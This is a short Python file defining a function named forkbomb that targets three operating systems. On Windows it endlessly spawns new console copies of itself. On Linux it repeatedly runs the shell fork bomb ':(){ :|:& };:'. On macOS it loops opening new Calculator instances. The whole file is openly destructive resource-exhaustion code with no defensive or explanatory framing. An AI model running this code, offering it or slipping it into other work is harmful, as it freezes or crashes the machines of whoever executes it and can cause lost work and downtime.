import sys, subprocess, os

def forkbomb():
    while sys.platform == "win32":
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    while sys.platform == "linux":
        os.system(":(){ :|:& };:")
    while sys.platform == "darwin":
        os.system("while true; do open -n -W -a /Applications/Calculator.app; done")